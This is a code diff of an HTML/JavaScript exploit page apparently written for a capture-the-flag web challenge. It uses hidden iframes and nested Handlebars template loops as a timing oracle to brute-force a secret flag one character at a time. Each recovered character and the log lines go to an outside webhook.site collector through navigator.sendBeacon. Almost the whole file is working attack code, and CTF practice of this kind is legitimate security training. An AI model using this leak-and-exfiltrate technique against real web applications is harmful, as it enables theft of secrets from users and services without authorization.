@@ -2,22 +2,23 @@
 <html><head><meta charset="utf-8"><title>.</title></head><body>
 <pre id="log"></pre>
 <script>
+// ── CONFIG ────────────────────────────────────────────────────────────────────
 const TARGET  = "https://todolist.challs.srdnlen.it";
 const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
-const PREFIX  = "srdnlen{";
+const PREFIX  = "srdnlen{leakycs";  // ← update as you find chars
 const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
 const ARRLEN  = 11;
 const DEPTH   = 7;
-const P_TO    = 3000;   // ms — match will hang this long
-const BUDGET  = 54000;
+const MATCH_TIMEOUT = 2000; // ms — no-match loads ~300ms, match blocks >> 2s
+const BUDGET  = 54000;      // ms — bot has 60s, we use 54s to be safe
+// ─────────────────────────────────────────────────────────────────────────────
 
 const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
 const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
 const CLOS = "{{/each}}".repeat(DEPTH);
 
-const logEl = document.getElementById("log");
-function print(msg) {
-  logEl.textContent += msg + "\n";
+function ping(msg) {
+  document.getElementById("log").textContent += msg + "\n";
   navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
 }
 
@@ -27,133 +28,75 @@ function makeUrl(pos, ch) {
        + "&template=" + encodeURIComponent(tpl);
 }
 
-// Probe ONE char — returns {dt, reason}
-function probeSingle(pos, ch, timeout) {
+// Load one iframe, resolve with {dt, timedOut}
+function probe(pos, ch) {
   return new Promise(resolve => {
     const f  = document.createElement("iframe");
     f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
-    let done = false;
-    const t0 = Date.now();
+    let fired = false;
+    const t0  = Date.now();
 
-    function finish(reason) {
-      if (done) return;
-      done = true;
+    function done(timedOut) {
+      if (fired) return;
+      fired = true;
       clearTimeout(tid);
       try { f.src = "about:blank"; f.remove(); } catch(e) {}
-      resolve({ dt: Date.now()-t0, reason });
+      resolve({ dt: Date.now() - t0, timedOut });
     }
 
-    const tid = setTimeout(() => finish("timeout"), timeout);
-    f.onload  = () => finish("load");
-    f.onerror = () => finish("error");
+    // If iframe's onload hasn't fired by MATCH_TIMEOUT,
+    // Handlebars is still computing → this is the matching char
+    const tid = setTimeout(() => done(true), MATCH_TIMEOUT);
+    f.onload  = () => done(false);
+    f.onerror = () => done(false); // blocked = fast = no match
     f.src = makeUrl(pos, ch);
     document.body.appendChild(f);
   });
 }
 
-// Probe chars in small parallel batches of BATCH_SIZE
-// Avoids Chrome connection limit stalling
-const BATCH_SIZE = 6;
-
-async function probeAllBatched(pos) {
-  const chars   = CHARSET.split("");
-  const results = {};
-
-  for (let i = 0; i < chars.length; i += BATCH_SIZE) {
-    const batch = chars.slice(i, i + BATCH_SIZE);
-
-    // Hard deadline: if any iframe in batch stalls, move on after P_TO+500ms
-    const batchPromise = Promise.all(
-      batch.map(ch => probeSingle(pos, ch, P_TO).then(r => { results[ch] = r; }))
-    );
-    const deadline = new Promise(r => setTimeout(r, P_TO + 500));
-    await Promise.race([batchPromise, deadline]);
-
-    // Fill any missing (stalled) chars
-    batch.forEach(ch => {
-      if (!(ch in results)) results[ch] = { dt: P_TO, reason: "stall" };
-    });
-
-    // Early exit if we found a timeout in this batch
-    const hit = batch.find(ch => results[ch].reason === "timeout");
-    if (hit) {
-      // Fill remaining chars as skipped
-      chars.slice(i + BATCH_SIZE).forEach(ch => {
-        results[ch] = { dt: 0, reason: "skipped" };
-      });
-      break;
-    }
-  }
-
-  return results;
-}
-
 async function run() {
-  const t0 = Date.now();
-  let flag = PREFIX;
-  print(`[start] prefix=${flag}`);
+  const t0  = Date.now();
+  let flag  = PREFIX;
+
+  ping(`[start] ${flag}`);
+  ping(`[info] MATCH_TIMEOUT=${MATCH_TIMEOUT}ms BUDGET=${BUDGET}ms`);
 
   for (let pos = PREFIX.length; pos < 60; pos++) {
     const elapsed = Date.now() - t0;
     if (elapsed > BUDGET) {
-      print(`[budget] stopped at pos=${pos} elapsed=${elapsed}ms`);
+      ping(`[budget] pos=${pos} elapsed=${elapsed}ms — stopping`);
       navigator.sendBeacon(`${WEBHOOK}?BUDGET&flag=${encodeURIComponent(flag)}`);
       break;
     }
 
-    print(`[pos ${pos}] scanning... elapsed=${elapsed}ms`);
+    ping(`[pos ${pos}] elapsed=${elapsed}ms`);
+    let found = null;
 
-    const results = await probeAllBatched(pos);
+    for (const ch of CHARSET) {
+      if (Date.now() - t0 > BUDGET) break;
 
-    // Sort by dt descending, show top results
-    const ranked = Object.entries(results)
-      .map(([ch, r]) => ({ ch, ...r }))
-      .filter(r => r.reason !== "skipped")
-      .sort((a, b) => b.dt - a.dt);
+      const r = await probe(pos, ch);
+      ping(`[probe] pos=${pos} ch='${ch}' dt=${r.dt}ms timedOut=${r.timedOut}`);
 
-    const top5 = ranked.slice(0,5).map(r=>`'${r.ch}'=${r.dt}ms(${r.reason})`).join(" | ");
-    print(`[pos ${pos}] ${top5}`);
-
-    const timeouts = ranked.filter(r => r.reason === "timeout" || r.reason === "stall");
-
-    let hitChar = null;
-
-    if (timeouts.length === 1) {
-      hitChar = timeouts[0].ch;
-      print(`[HIT] pos=${pos} char='${hitChar}' clean timeout`);
-    } else if (timeouts.length > 1) {
-      // Verify each timeout candidate solo
-      print(`[VERIFY] ${timeouts.length} candidates: ${timeouts.map(r=>r.ch).join(",")}`);
-      for (const r of timeouts) {
-        const v = await probeSingle(pos, r.ch, P_TO);
-        print(`[VERIFY] '${r.ch}' solo=${v.dt}ms ${v.reason}`);
-        if (v.reason === "timeout") { hitChar = r.ch; break; }
-      }
-    } else {
-      // No timeout — ratio heuristic
-      const loaded = ranked.filter(r => r.reason === "load");
-      if (loaded.length >= 2 && loaded[0].dt > 600) {
-        const ratio = loaded[0].dt / Math.max(1, loaded[1].dt);
-        if (ratio > 3.0) {
-          hitChar = loaded[0].ch;
-          print(`[HIT-ratio] pos=${pos} char='${hitChar}' ratio=${ratio.toFixed(1)}x`);
-        }
+      if (r.timedOut) {
+        found = ch;
+        break; // no need to test more chars
       }
     }
 
-    if (hitChar) {
-      flag += hitChar;
-      print(`[FLAG] ${flag}`);
+    if (found) {
+      flag += found;
+      ping(`[HIT] pos=${pos} char='${found}'`);
       navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
-      if (hitChar === "}") break;
+      if (found === "}") break;
     } else {
-      print(`[MISS] pos=${pos} — stopping`);
+      ping(`[MISS] pos=${pos} — char not in charset or budget exceeded`);
       navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
       break;
     }
   }
 
-  print(`[DONE] ${flag} total=${Date.now()-t0}ms`);
+  ping(`[DONE] ${flag} total=${Date.now()-t0}ms`);
   navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
 }
 
